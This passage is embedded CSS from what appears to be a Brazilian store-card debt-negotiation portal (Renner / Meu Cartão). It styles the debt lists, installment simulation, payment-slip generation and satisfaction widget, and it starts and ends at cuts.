         .encantometro-portal .flex-holder .card.ativo.card--satisfeito .icon svg * {
         stroke: #1e1e1f; }
         .encantometro-portal .flex-holder .card.ativo.card--insatisfeito .icon svg * {
         stroke: #cf3e3e; }
         .encantometro-portal .flex-holder .card.ativo .icon svg * {
         stroke-width: 3px; }
         .encantometro-portal .flex-holder .card {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-transition: box-shadow 0.5s linear;
         transition: box-shadow 0.5s linear;
         margin: 0;
         margin-right: 10px;
         border: 1px solid #e0e0e0;
         cursor: pointer;
         padding: 10px;
         width: 200px;
         height: 70px; }
         .encantometro-portal .flex-holder .card .icon {
         margin-right: 10px;
         color: white; }
         .encantometro-portal .flex-holder .card .icon svg * {
         stroke: #acacac; }
         .encantometro-portal .flex-holder .card p {
         margin: 0;
         color: #1e1e1f; }
         .encantometro-portal .flex-holder button {
         -webkit-box-flex: 1;
         flex: 1; }
         .encantometro-portal button {
         margin-left: 10px;
         height: 38px;
         line-height: 1; }
         @media (max-width: 1023px) {
         .encantometro-portal {
         border: 0;
         background: #f2f2f2; }
         .encantometro-portal .enviado .button.button--default.button--outline {
         background-color: transparent;
         width: 100%; }
         .encantometro-portal .enviado p {
         text-align: center; }
         .encantometro-portal .titulo {
         text-align: center; }
         .encantometro-portal .flex-holder {
         -webkit-box-align: normal;
         align-items: normal;
         flex-wrap: wrap; }
         .encantometro-portal .flex-holder .button.button--default.button--outline {
         flex-basis: 100%;
         margin: 0;
         margin-top: 20px;
         background-color: transparent;
         width: 100%; }
         .encantometro-portal .flex-holder .card {
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin: 0;
         border: none;
         background: transparent;
         padding: 0;
         width: 33%;
         height: auto;
         text-align: center;
         -webkit-tap-highlight-color: transparent; }
         .encantometro-portal .flex-holder .card .text-holder {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-flex: 1;
         flex: 1; }
         .encantometro-portal .flex-holder .card .icon {
         margin: 0 0 5px;
         color: transparent; }
         .encantometro-portal .flex-holder .card.ativo {
         box-shadow: none; }
         .encantometro-portal .flex-holder .card.ativo p {
         font-weight: normal; } }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .cartao-renner .lista-dividas:after,
         .meu-cartao .cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .lista-dividas:after {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .cartao-renner .lista-dividas:after,
         .cartao-renner .lista-dividas--header,
         .meu-cartao .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .lista-dividas:after,
         .meu-cartao .cartao-renner .lista-dividas--header {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed,
         .cartao-renner.theme-priority .lista-dividas:after {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed,
         .cartao-renner.theme-priority .lista-dividas:after,
         .cartao-renner.theme-priority .lista-dividas--header {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed,
         .meu-cartao .lista-dividas:after,
         .cartao-renner .meu-cartao .lista-dividas:after {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .meu-cartao .lista-dividas:after,
         .meu-cartao .lista-dividas--header,
         .cartao-renner .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .lista-dividas:after,
         .cartao-renner .meu-cartao .lista-dividas--header {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed,
         .meu-cartao.theme-priority .lista-dividas:after {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed,
         .meu-cartao.theme-priority .lista-dividas:after,
         .meu-cartao.theme-priority .lista-dividas--header {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .lista-dividas {
         position: relative;
         margin-top: 20px;
         margin-bottom: 20px;
         border: 1px solid #e0e0e0;
         border-bottom-left-radius: 5px;
         border-bottom-right-radius: 5px;
         padding-top: 13px; }
         @media (max-width: 767px) {
         .lista-dividas {
         padding-top: 8px; } }
         .lista-dividas .erro-busca-desconto {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin: 0 10px;
         border-bottom: 1px solid #e0e0e0;
         padding: 15px 0; }
         @media (min-width: 768px) {
         .lista-dividas .erro-busca-desconto {
         margin: 0 20px; } }
         @media (max-width: 767px) {
         .lista-dividas .erro-busca-desconto {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         border-top: 1px solid #e0e0e0; }
         .lista-dividas .erro-busca-desconto__mensagem p {
         font-size: 14px; }
         .lista-dividas .erro-busca-desconto loader {
         margin-top: 10px;
         width: 100%; }
         .lista-dividas .erro-busca-desconto loader .button {
         width: 100%; } }
         .lista-dividas .erro-busca-desconto .button {
         width: 152px; }
         .lista-dividas .erro-busca-desconto__mensagem {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .lista-dividas .erro-busca-desconto__mensagem .icon svg {
         margin-right: 9px;
         width: 23px;
         height: 23px;
         color: #cf3e3e; }
         @media (max-width: 767px) {
         .lista-dividas .erro-busca-desconto__mensagem .icon svg {
         width: 15px;
         height: 15px; } }
         .lista-dividas .erro-busca-desconto__mensagem p {
         color: #cf3e3e; }
         @media (max-width: 767px) {
         .lista-dividas:after {
         box-sizing: content-box;
         position: absolute;
         top: -8px;
         left: -1px;
         border: 1px solid grey;
         width: 100%;
         height: 8px;
         content: ""; } }
         .lista-dividas h3,
         .lista-dividas p {
         margin: 0; }
         .lista-dividas .text-qntd-mostrando {
         color: #1e1e1f;
         font-size: 12px; }
         @media (min-width: 768px) {
         .lista-dividas .text-qntd-mostrando {
         font-size: 14px; } }
         .lista-dividas--warning, .lista-dividas--listagem {
         margin: 0 10px; }
         @media (min-width: 768px) {
         .lista-dividas--warning, .lista-dividas--listagem {
         margin: 0 20px; } }
         .lista-dividas--header, .lista-dividas--warning {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         border-bottom: 1px solid #e0e0e0;
         padding-bottom: 15px; }
         .lista-dividas--warning {
         padding-top: 15px; }
         .lista-dividas--header {
         -webkit-box-pack: justify;
         justify-content: space-between;
         border-bottom: 3px solid #e0e0e0;
         padding-right: 20px;
         padding-left: 20px; }
         @media (max-width: 767px) {
         .lista-dividas--header {
         border: none;
         padding-right: 10px;
         padding-left: 10px; } }
         .lista-dividas--header h3 {
         font-size: 20px; }
         .lista-dividas--toggle {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         border-top: 1px solid #e0e0e0;
         cursor: pointer;
         height: 38px; }
         .lista-dividas--toggle p {
         text-transform: uppercase;
         font-size: 12px;
         font-weight: 500; }
         .lista-dividas--toggle .triangle {
         -webkit-transform: rotate(45deg) translateY(-4px);
         transform: rotate(45deg) translateY(-4px);
         margin-right: 16px;
         border-right: 2px solid red;
         border-bottom: 2px solid red;
         width: 9px;
         height: 9px; }
         .lista-dividas--toggle .triangle.inverter {
         -webkit-transform: rotate(225deg) translateY(-2px);
         transform: rotate(225deg) translateY(-2px); }
         .lista-dividas.lite {
         padding: 0; }
         .lista-dividas.lite:after {
         display: none; }
         .lista-dividas.lite .erro-busca-desconto {
         border-top: none; }
         .lista-dividas.lite .lista-dividas--listagem {
         border: none; }
         .lista-dividas.lite .loading-bar {
         padding-top: 15px; }
      </style>
      <style type="text/css">.resumo-divida {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding: 20px 0; }
         @media (max-width: 1023px) {
         .resumo-divida {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; } }
         .resumo-divida p,
         .resumo-divida h4 {
         margin: 0; }
         .resumo-divida--content {
         display: grid;
         grid-template-columns: 1fr 2fr;
         width: 100%; }
         @media (max-width: 1023px) {
         .resumo-divida--content {
         grid-template-columns: 100px 1fr;
         grid-row-gap: 5px; }
         .resumo-divida--content .label-desconto,
         .resumo-divida--content .valor {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: end;
         align-items: flex-end;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; } }
         .resumo-divida--content .nome-divida {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .resumo-divida--content .nome-divida h4 {
         font-size: 20px; }
         @media (max-width: 1023px) {
         .resumo-divida--content .nome-divida h4 {
         font-size: 16px; } }
         .resumo-divida--content .nome-divida i svg {
         margin-right: 10px;
         height: 16px; }
         @media (max-width: 1023px) {
         .resumo-divida--content .nome-divida i svg {
         margin-right: 5px;
         height: 14px; } }
         .resumo-divida--content .label-desconto .erro {
         color: #cf3e3e; }
         @media (max-width: 767px) {
         .resumo-divida--content .label-desconto .erro {
         font-size: 12px; } }
         .resumo-divida--content .label-desconto .valor-original-divida {
         position: relative;
         float: left;
         margin-right: 7px;
         line-height: 1.7;
         color: #acacac;
         font-size: 16px;
         font-weight: 700; }
         @media (max-width: 1023px) {
         .resumo-divida--content .label-desconto .valor-original-divida {
         font-size: 14px; } }
         .resumo-divida--content .label-desconto .valor-original-divida:after {
         position: absolute;
         top: 50%;
         left: -2%;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         background-image: url('data:image/svg+xml;charset=utf-8, %3Csvg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none" viewBox="0 0 100 100"%3E%3Cpath d="M100.002 0L-.078 89.91l.07 10.172 100.03-90.048z" fill="%23ACACAC" /%3E%3C/svg%3E');
         width: 104%;
         height: 50%;
         content: ""; }
         .resumo-divida--content .label-desconto .label {
         border-radius: 5px;
         background: none;
         padding: 1px 6px;
         font-size: 12px;
         font-weight: 700; }
         .resumo-divida--content .label-desconto .label:not(.tem-desconto) {
         border: 1px solid #706f6f;
         color: #706f6f; }
         .resumo-divida--content .label-desconto .label.tem-desconto {
         background: #3ecf7a;
         color: white; }
         .resumo-divida--content .atraso {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: end;
         align-items: flex-end; }
         .resumo-divida--content .atraso p {
         font-size: 14px; }
         @media (max-width: 1023px) {
         .resumo-divida--content .atraso p {
         font-size: 12px; } }
         .resumo-divida--content .atraso .value {
         margin-left: 4px;
         color: #cf3e3e;
         font-weight: 700; }
         .resumo-divida--content .valor p {
         line-height: 1;
         color: #1e1e1f;
         font-size: 32px;
         font-weight: 700; }
         @media (max-width: 1023px) {
         .resumo-divida--content .valor p {
         font-size: 24px; } }
         .resumo-divida--actions {
         display: -webkit-box;
         display: flex; }
         @media (max-width: 1023px) {
         .resumo-divida--actions {
         -webkit-box-orient: vertical;
         -webkit-box-direction: reverse;
         flex-direction: column-reverse;
         width: 100%; }
         .resumo-divida--actions button.button {
         width: 100%; }
         .resumo-divida--actions > :last-child {
         margin-top: 15px;
         margin-bottom: 10px; } }
         .resumo-divida--actions > :first-child {
         margin-right: 20px; }
         .resumo-divida--actions .button {
         width: 155px; }
      </style>
      <style type="text/css">.origem-divida {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         border: 1px solid #e0e0e0;
         background: #f2f2f2;
         padding: 10px; }
         .origem-divida h3,
         .origem-divida p {
         margin: 0;
         font-size: 14px; }
         .origem-divida i {
         margin-right: 10px;
         margin-left: 7px; }
      </style>
      <style type="text/css">@charset "UTF-8";
         @media (max-width: 767px) {
         .modal.modal-simular-negociacao {
         width: 320px; } }
         .modal.modal-simular-negociacao {
         padding: 50px 58px 40px;
         width: 768px; }
         .modal.modal-simular-negociacao .modal__content {
         margin-bottom: 30px; }
         .modal.modal-simular-negociacao .modal__title {
         margin-bottom: 15px; }
         .modal.modal-simular-negociacao .modal__content-subtitle {
         font-size: 14px; }
         .modal.modal-simular-negociacao .button {
         width: 200px; }
         .modal__content-quotes {
         text-align: center;
         font-weight: 400;
         font-style: italic; }
         .modal__content-quotes .ng-carousel {
         height: 50px; }
         .modal__content-quotes p {
         margin: 0;
         white-space: normal; }
         .modal-alterar-data {
         padding: 35px 30px 60px; }
         .modal-alterar-data .modal__title {
         letter-spacing: -0.5px; }
         .modal-alterar-data .modal__content {
         margin-bottom: 25px; }
         .modal-alterar-data .select-input .select-box {
         display: block;
         margin: 0 auto;
         width: 200px;
         width: 190px;
         text-align: center;
         color: #acacac; }
         .modal-alterar-data .select-input .select-box .select__text--value {
         color: #acacac;
         font-weight: 300; }
         .modal-alterar-data .select-input .select-box .select__text--value:before {
         content: "dia "; }
         .modal-alterar-data .select-input--default-value .select-box .select__text--value:after {
         content: " (atual)"; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .ipad .modal-alterar-data {
         position: fixed;
         top: 30%;
         left: 25%; } }
         .modal-alterar-entrada {
         padding: 35px 30px 60px; }
         .modal-alterar-entrada .fields {
         margin: 0 50px 10px; }
         .modal-alterar-entrada .modal__title {
         letter-spacing: -0.5px; }
         .modal-alterar-entrada .input-hint-text {
         margin-top: 5px;
         line-height: 16px;
         color: #acacac;
         font-size: 14px;
         font-style: italic; }
         .modal-alterar-entrada .modal__content {
         margin-bottom: 25px; }
         .modal-alterar-entrada .modal__content .modal__valor-entrada {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
         .modal-alterar-entrada .modal__content .modal__valor-entrada .textfield__valor-entrada {
         width: 185px; }
         .modal-alterar-entrada .modal__content .modal__valor-entrada .textfield__valor-entrada .textfield__input,
         .modal-alterar-entrada .modal__content .modal__valor-entrada .textfield__valor-entrada .textfield__prefix {
         font-size: 24px;
         font-weight: 300; }
         .modal-alterar-entrada .modal__content .modal__valor-entrada .textfield__valor-entrada .textfield__input {
         text-align: right; }
         .modal-alterar-entrada .modal__content .modal__valor-entrada .textfield__valor-entrada .field-message {
         display: none; }
         @media (max-width: 767px) {
         .modal.modal-alterar-entrada {
         width: auto; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .ipad .modal-alterar-entrada {
         position: fixed;
         top: 30%;
         left: 25%; } }
         .oferta-exclusiva {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-top: 20px;
         border: 1px solid #e0e0e0;
         background: #f2f2f2;
         padding: 17px 22px;
         color: #706f6f; }
         .oferta-exclusiva p {
         margin: 0; }
         .oferta-exclusiva i {
         margin-right: 10px; }
         .oferta-exclusiva i svg {
         height: 19px; }
         .simular-negociacao .row {
         margin: 0; }
         .simular-negociacao #onboarding-opcoes-negociacao.onboarding-item {
         padding-top: 0; }
         .simular-negociacao #onboarding-opcoes-negociacao.onboarding-item,
         .simular-negociacao #onboarding-opcoes-negociacao-mobile.onboarding-item {
         background: white; }
         .simular-negociacao .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit; }
         .simular-negociacao .block__header .block__header-title .block__header-text {
         padding-left: 0; }
         .simular-negociacao .block__header .block__header-subtitle {
         margin-top: 10px; }
         .simular-negociacao .block__header .block__header-subtitle .block__header-text {
         margin: 0;
         font-size: 18px;
         font-weight: 300; }
         .simular-negociacao .block__resumo,
         .simular-negociacao .block__footer {
         border-top: 1px solid #e0e0e0; }
         .simular-negociacao .block__opcoes {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-flow: row wrap;
         margin-top: 30px;
         margin-bottom: 5px;
         padding: 5px 0;
         color: #1e1e1f; }
         .simular-negociacao .block__opcoes label {
         display: -webkit-box;
         display: flex; }
         .simular-negociacao .block__opcoes .opcao-parcelamento {
         position: relative;
         margin-bottom: 12px;
         border-radius: 3px;
         cursor: pointer;
         padding: 14px;
         min-width: 170px; }
         .simular-negociacao .block__opcoes .opcao-parcelamento:first-child:after {
         position: absolute;
         bottom: 0;
         left: 50%;
         -webkit-transform: translate(-50%, 50%);
         transform: translate(-50%, 50%);
         border-radius: 5px;
         background: #3ecf7a;
         width: 100px;
         text-align: center;
         color: white;
         font-size: 12px;
         font-weight: 700;
         content: "mais econômico"; }
         .simular-negociacao .block__opcoes .opcao-parcelamento input[type="radio"] {
         display: none; }
         .simular-negociacao .block__opcoes .opcao-parcelamento .opcao-parcelamento__radio {
         display: block;
         -webkit-transition: all 0.2s ease;
         transition: all 0.2s ease;
         margin-right: 10px;
         border: 4px solid #e0e0e0;
         border-radius: 100%;
         background-color: #e0e0e0;
         width: 18px;
         height: 18px; }
         .simular-negociacao .block__opcoes .opcao-parcelamento.opcao-parcelamento--selected {
         background-color: #f2f2f2; }
         .cartao-renner .simular-negociacao .block__opcoes .opcao-parcelamento.opcao-parcelamento--selected .opcao-parcelamento__radio {
         background-color: #d71920; }
         .meu-cartao .simular-negociacao .block__opcoes .opcao-parcelamento.opcao-parcelamento--selected .opcao-parcelamento__radio {
         background-color: #ac8947; }
         .simular-negociacao .block__opcoes .opcao-parcelamento .opcao-parcelamento__label {
         display: block;
         font-size: 12px;
         font-weight: 300; }
         .simular-negociacao .block__opcoes .opcao-parcelamento .opcao-parcelamento__value {
         font-size: 18px;
         font-weight: 700; }
         .simular-negociacao .block__opcoes .opcao-parcelamento .opcao-parcelamento__value-desconto {
         display: block;
         line-height: 100%;
         letter-spacing: -0.5px;
         color: #3ecf7a;
         font-size: 14px; }
         .simular-negociacao .block__resumo {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         padding-top: 50px; }
         .simular-negociacao .block__resumo .origem-divida {
         border-bottom: none; }
         .simular-negociacao .block__resumo .cards {
         display: grid;
         grid-template-columns: 270px auto;
         grid-template-rows: 75px 75px;
         grid-auto-flow: column; }
         .simular-negociacao .block__resumo .cards .card {
         margin: 0;
         border: 1px solid #e0e0e0;
         padding: 0; }
         .simular-negociacao .block__resumo .cards .card .icon {
         margin-right: 20px; }
         .simular-negociacao .block__resumo .cards .card .icon svg {
         height: 32px; }
         .simular-negociacao .block__resumo .cards .card--atraso,
         .simular-negociacao .block__resumo .cards .card--desconto {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         padding: 20px 23px; }
         .simular-negociacao .block__resumo .cards .card--atraso .label-value p,
         .simular-negociacao .block__resumo .cards .card--desconto .label-value p {
         margin: 0; }
         .simular-negociacao .block__resumo .cards .card--atraso .label-value__label,
         .simular-negociacao .block__resumo .cards .card--desconto .label-value__label {
         text-transform: uppercase;
         color: #706f6f;
         font-size: 12px;
         font-weight: 300; }
         .simular-negociacao .block__resumo .cards .card--atraso .label-value__value,
         .simular-negociacao .block__resumo .cards .card--desconto .label-value__value {
         font-weight: 700; }
         .simular-negociacao .block__resumo .cards .no-discount {
         grid-row-end: span 2;
         -webkit-box-align: start;
         align-items: flex-start; }
         .simular-negociacao .block__resumo .cards .card--desconto {
         color: #3ecf7a; }
         .simular-negociacao .block__resumo .cards .card--valores {
         border-left: none;
         grid-row-end: span 2;
         padding: 15px 17px; }
         .simular-negociacao .block__resumo .cards .card--valores .line {
         display: block;
         margin-bottom: 9px;
         border-top: 1px solid #e0e0e0;
         width: 100%; }
         .simular-negociacao .block__resumo .cards .card--valores__row {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-bottom: 9px; }
         .simular-negociacao .block__resumo .cards .card--valores__row p {
         margin: 0; }
         .simular-negociacao .block__resumo .cards .card--valores__row p:first-child {
         font-size: 12px; }
         .simular-negociacao .block__resumo .cards .card--valores__row p:last-child {
         font-size: 14px;
         font-weight: 700; }
         .simular-negociacao .block__total {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: end;
         justify-content: flex-end;
         padding: 20px 0; }
         .simular-negociacao .block__total .empty-space {
         -webkit-box-flex: 1;
         flex: 1; }
         .simular-negociacao .block__total .resumo-valores__value {
         margin-left: 10px;
         text-align: right; }
         .simular-negociacao .block__total ul.onboarding-item {
         box-shadow: 0 0 0 5px white;
         background: white; }
         .simular-negociacao .block__total li {
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .simular-negociacao .block__total .descricao-total {
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 300;
         font-style: italic; }
         .simular-negociacao .resumo-valores {
         margin: 0;
         list-style: none; }
         .simular-negociacao .resumo-valores .loader--show button {
         min-width: 137px; }
         .simular-negociacao .resumo-valores li {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         flex-wrap: wrap;
         margin-bottom: 20px;
         text-align: right; }
         .simular-negociacao .resumo-valores li:last-of-type {
         margin-bottom: 0; }
         .simular-negociacao .resumo-valores .resumo-valores__label {
         text-transform: uppercase;
         color: #acacac;
         font-size: 12px; }
         .simular-negociacao .resumo-valores .resumo-valores__value {
         letter-spacing: -0.5px;
         color: #1e1e1f;
         font-size: 18px;
         font-weight: 700; }
         .simular-negociacao .resumo-valores .resumo-valores__value--entrada {
         margin: 0 5px; }
         .simular-negociacao .resumo-valores .resumo-valores__value--atraso {
         color: #cf3e3e; }
         .simular-negociacao .resumo-valores .resumo-valores__value--desconto {
         color: #3ecf7a; }
         .simular-negociacao .resumo-valores .resumo-valores__value--alterar-campo {
         margin-top: -3px;
         margin-left: 8px; }
         .simular-negociacao .resumo-valores .resumo-valores__value--huge {
         font-size: 36px; }
         .simular-negociacao .block__footer {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap-reverse;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding-top: 20px; }
         .simular-negociacao .block__footer .button {
         min-width: 200px; }
         @media (max-width: 1023px) {
         .simular-negociacao .block__opcoes {
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-top: 20px; }
         .simular-negociacao .block__opcoes .opcao-parcelamento {
         margin: 9px 0;
         border: 1px solid #e0e0e0;
         padding: 18px 10px; }
         .simular-negociacao .block__opcoes .opcao-parcelamento .opcao-parcelamento__radio {
         display: none; }
         .simular-negociacao .block__opcoes .opcao-parcelamento .opcao-parcelamento__label {
         font-size: 12px; }
         .simular-negociacao .block__total li {
         -webkit-box-align: end;
         align-items: flex-end;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: column nowrap; }
         .simular-negociacao .block__total .resumo-valores__value {
         margin-left: inherit; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .simular-negociacao .opcao-parcelamento {
         flex-basis: 48%; } }
         @media (max-width: 767px) {
         .simular-negociacao .block__header {
         margin: 0; }
         .simular-negociacao .block__header .block__header-title .block__header-text {
         font-size: 20px; }
         .simular-negociacao .block__header .block__header-subtitle .block__header-text {
         font-size: 14px; }
         .simular-negociacao .block__resumo .cards {
         grid-template-columns: 130px auto;
         grid-template-rows: 50px auto;
         grid-auto-flow: row; }
         .simular-negociacao .block__resumo .cards .card {
         padding: 10px;
         line-height: 1; }
         .simular-negociacao .block__resumo .cards .card .icon {
         margin-right: 10px; }
         .simular-negociacao .block__resumo .cards .card .icon svg {
         height: 18px; }
         .simular-negociacao .block__resumo .cards .card .label-value__label {
         font-size: 12px; }
         .simular-negociacao .block__resumo .cards .card .label-value__value {
         font-size: 16px; }
         .simular-negociacao .block__resumo .cards .card--valores {
         grid-column-end: span 2;
         border-left: 1px solid #e0e0e0; }
         .simular-negociacao .block__resumo .cards .card--desconto {
         border-bottom: none;
         border-left: none; }
         .simular-negociacao .block__resumo .cards .card--atraso .label-value__label {
         font-size: 10px; }
         .simular-negociacao .block__resumo .cards .card--atraso .label-value__value {
         font-size: 14px; }
         .simular-negociacao .block__resumo .no-discount {
         grid-template-columns: 100% auto; }
         .simular-negociacao .block__resumo .no-discount:first-child {
         border-bottom: none; }
         .simular-negociacao .block__opcoes {
         margin-top: 0; }
         .simular-negociacao .block__opcoes .opcao-parcelamento {
         min-width: 49%; }
         .simular-negociacao .block__total .oferta-exclusiva p {
         font-size: 14px; }
         .simular-negociacao .block__total .resumo-valores .resumo-valores__value,
         .simular-negociacao .block__total .resumo-valores .resumo-valores__label {
         width: 100%; }
         .simular-negociacao .block__total .resumo-valores .resumo-valores__value--alterar-campo {
         margin: 0; }
         .simular-negociacao .block__total .onboarding-tooltip .onboarding-tooltip__container {
         top: 50%;
         bottom: inherit;
         left: -30%;
         margin-top: 25px; }
         .simular-negociacao .block__total .onboarding-tooltip .onboarding-tooltip__container:before {
         top: -20px;
         right: 35%;
         border-right: 10px solid transparent;
         border-bottom: 10px solid white;
         border-left: 10px solid transparent; }
         .simular-negociacao .block__footer .loader {
         margin-bottom: 10px;
         width: 100%; }
         .simular-negociacao .block__footer .button {
         width: 100%; } }
      </style>
      <style type="text/css">.gerar-boleto {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-bottom: 30px;
         border: 1px solid #acacac;
         padding: 0 15px;
         width: 100%;
         max-width: 850px;
         height: 80px; }
         .gerar-boleto .holder {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .gerar-boleto .plus {
         font-size: 14px;
         font-weight: 900; }
         .gerar-boleto .icon {
         width: 32px;
         height: 32px;
         color: #3ecf7a; }
         .gerar-boleto .arrow {
         position: relative;
         width: 50px; }
         .gerar-boleto .arrow:after, .gerar-boleto .arrow:before {
         display: block;
         position: absolute;
         top: 50%;
         border: 1px solid #3ecf7a;
         content: ""; }
         .gerar-boleto .arrow:before {
         right: 50%;
         -webkit-transform: translateX(50%);
         transform: translateX(50%);
         width: 30px; }
         .gerar-boleto .arrow:after {
         right: 5px;
         -webkit-transform: rotate(45deg) translate(-53%);
         transform: rotate(45deg) translate(-53%);
         border-bottom: 0;
         border-left: 0;
         border-width: 3px;
         border-radius: 1px;
         width: 12px;
         height: 12px; }
         .gerar-boleto .arrow-head {
         display: block;
         -webkit-transform: translateX(-25%) rotate(45deg);
         transform: translateX(-25%) rotate(45deg);
         border: 1px solid #3ecf7a;
         border-bottom: 0;
         border-left: 0;
         border-width: 2px;
         border-radius: 1px;
         width: 10px;
         height: 10px; }
         .gerar-boleto p {
         margin: 0;
         text-align: left; }
         @media (max-width: 1023px) {
         .gerar-boleto {
         flex-wrap: wrap;
         -webkit-box-pack: center;
         justify-content: center;
         padding: 20px 30px;
         height: auto; }
         .gerar-boleto .plus {
         font-size: 18px; }
         .gerar-boleto b {
         font-size: 18px;
         font-weight: 900; }
         .gerar-boleto .row-info {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-align: center;
         align-items: center;
         width: 380px; }
         .gerar-boleto .row-info .arrow-head {
         margin: 10px; }
         .gerar-boleto .row-info .item-acordo {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-flex: 1;
         flex: 1;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .gerar-boleto .holder.holder--full-line {
         -webkit-box-flex: 1;
         flex: 1 0 100%;
         -webkit-box-pack: center;
         justify-content: center;
         width: 100%; }
         .gerar-boleto .holder.holder--full-line .icon {
         margin: 12px 0;
         width: 36px;
         height: 36px; }
         .gerar-boleto .holder__button-container {
         padding-top: 20px; } }
         @media (min-width: 1024px) {
         .gerar-boleto .plus {
         margin: 0 10px; } }
         @media (max-width: 767px) {
         .gerar-boleto {
         justify-content: space-around; }
         .gerar-boleto b {
         font-size: 16px; }
         .gerar-boleto p {
         font-size: 14px; }
         .gerar-boleto .line {
         margin: 22px 0;
         border: 1px solid #3ecf7a;
         width: 100px; }
         .gerar-boleto .holder.holder--acordo p {
         text-align: center; }
         .gerar-boleto .holder.holder--full-line .icon {
         width: 26px;
         height: 26px; }
         .gerar-boleto .holder__button-container {
         padding-top: 10px; } }
      </style>
      <style type="text/css">.texto-descritivo-divida b {
         font-weight: bold; }
         .texto-descritivo-divida * {
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 300; }
         @media (max-width: 767px) {
         .texto-descritivo-divida * {
         font-size: 14px; } }
      </style>
      <style type="text/css">.sucesso-negociacao .encantometro-portal {
         margin-top: 30px; }
         .sucesso-negociacao .header {
         display: inline-block;
         margin: 0 0 22px;
         padding-left: 0;
         font-size: 22px;
         font-weight: 300; }
         .sucesso-negociacao p {
         line-height: 21px;
         font-size: 16px;
         font-weight: 300; }
         .sucesso-negociacao .info .titulo {
         margin: 0 0 20px;
         line-height: 19px;
         font-size: 18px; }
         .sucesso-negociacao .info b {
         font-weight: 900; }
         .sucesso-negociacao .info p {
         margin-bottom: 10px; }
         .sucesso-negociacao button.voltar {
         margin-top: 30px;
         padding: 0 40px; }
         @media (max-width: 767px) {
         .sucesso-negociacao button.voltar {
         width: 100%; } }
         .modal-contraproposta .button.button--fixed-size {
         width: 210px; }
         @media (min-width: 768px) {
